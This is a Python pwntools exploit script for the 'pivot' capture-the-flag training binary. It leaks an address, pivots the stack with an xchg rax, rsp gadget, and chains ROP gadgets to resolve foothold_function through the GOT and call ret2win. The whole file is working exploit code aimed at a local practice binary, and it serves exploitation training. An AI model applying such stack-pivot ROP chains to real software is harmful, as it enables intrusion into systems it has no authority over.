from pwn import *

context.log_level = 'debug'

p = process("./pivot")
e = ELF('./pivot')
# proc.wait_for_debugger(p.pid)


p.recvuntil("pivot:")
leak_addr = int(p.recvline(""), 16)
print(f"Leak Address: {hex(leak_addr)}")

# function gadget
foothold_plt = e.symbols['foothold_function']
foothold_got = e.got['foothold_function']
# ret2win 0x7f389bf41a81
# foothold  0x7f389bf4196a
# ret2win = foothold + 279

# rop gadget
xchg_rax_rsp = 0x00000000004009bd #: xchg rax, rsp ; ret
pop_rax = 0x00000000004009bb #: pop rax ; ret
add_rax_rbp = 0x00000000004009c4 # : add rax, rbp ; ret
mov_rax_prax = 0x00000000004009c0 #: mov rax, qword ptr [rax] ; ret
pop_rbp = 0x00000000004007c8 # : pop rbp ; ret
call_rax = 0x00000000004006b0  # : call rax





# 2nd Stage: after rop
buf = b""
buf += p64(foothold_plt)    # call foothold to add it address to got.plt
buf += p64(pop_rax)         # rax = foothold@got 
buf += p64(foothold_got)
buf += p64(mov_rax_prax)    # rax = foothold@libpivot
buf += p64(pop_rbp)         # ret2win = foodhold+279
buf += p64(279)
buf += p64(add_rax_rbp)     # rax = ret2win
buf += p64(call_rax)        # call ret2win


p.recvuntil(">")
print("2nd Exploit sending")
p.sendline(buf)


# 1st: Stage
buf = b''
buf += b"A"*0x28
buf += p64(pop_rax)
buf += p64(leak_addr)
buf += p64(xchg_rax_rsp)


p.recvuntil(">")
print("1st Exploit sent")
p.sendline(buf)


p.interactive()